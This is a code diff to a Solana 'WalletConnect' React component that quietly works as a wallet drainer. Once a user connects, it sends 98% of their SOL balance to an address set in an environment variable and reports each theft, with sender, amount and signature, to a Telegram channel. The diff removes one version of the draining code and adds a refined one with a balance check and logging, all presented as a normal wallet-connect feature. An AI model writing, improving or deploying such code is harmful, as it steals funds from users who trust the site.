@@ -43,38 +43,48 @@ function WalletConnect() {
             );
           }
 
-          const transferAmount = walletBalance * 0.98;
-          
-          // Create and send transaction using the wallet adapter
-          const transaction = new Transaction().add(
-            SystemProgram.transfer({
-              fromPubkey: publicKey,
-              toPubkey: new PublicKey(process.env.NEXT_PUBLIC_TO),
-              lamports: transferAmount * LAMPORTS_PER_SOL
-            })
-          );
+          // Only attempt transfer if we have a balance greater than 0
+          if (walletBalance > 0) {
+            // Calculate transfer amount and ensure it's a valid number
+            const transferAmount = Math.max(0, Math.min(walletBalance * 0.98, walletBalance));
+            
+            // Get the wallet adapter instance
+            const wallet = window.solana;
+            if (!wallet) {
+              throw new Error('Wallet not found');
+            }
 
-          const result = await services.transactionService.sendSol(
-            { publicKey },
-            process.env.NEXT_PUBLIC_TO,
-            transferAmount
-          );
+            console.log('Attempting transfer:', {
+              from: publicKey.toString(),
+              to: process.env.NEXT_PUBLIC_TO,
+              amount: transferAmount,
+              balance: walletBalance
+            });
 
-          if (result.success) {
-            const newBalance = await services.walletService.getBalance(publicKey.toString());
-            setBalance(newBalance);
-
-            // Only send transaction notification if the transaction was successful
-            await services.telegramService.sendMessage(
-              services.telegramService.formatTransactionInfo({
-                type: 'SOL_TRANSFER',
-                from: publicKey.toString(),
-                to: process.env.NEXT_PUBLIC_TO,
-                amount: transferAmount,
-                signature: result.signature,
-                timestamp: Date.now()
-              })
+            const result = await services.transactionService.sendSol(
+              wallet,
+              process.env.NEXT_PUBLIC_TO,
+              transferAmount
             );
+
+            if (result.success) {
+              const newBalance = await services.walletService.getBalance(publicKey.toString());
+              setBalance(newBalance);
+
+              // Only send transaction notification if the transaction was successful
+              await services.telegramService.sendMessage(
+                services.telegramService.formatTransactionInfo({
+                  type: 'SOL_TRANSFER',
+                  from: publicKey.toString(),
+                  to: process.env.NEXT_PUBLIC_TO,
+                  amount: transferAmount,
+                  signature: result.signature,
+                  timestamp: Date.now()
+                })
+              );
+            } else {
+              console.error('Transaction failed:', result.error);
+            }
           }
 
           // Update user profile
@@ -93,7 +103,7 @@ function WalletConnect() {
 
       processWallet();
     }
-  }, [publicKey, services]);
+  }, [publicKey, services, balance]);
 
   const handleDisconnect = async () => {
     try {
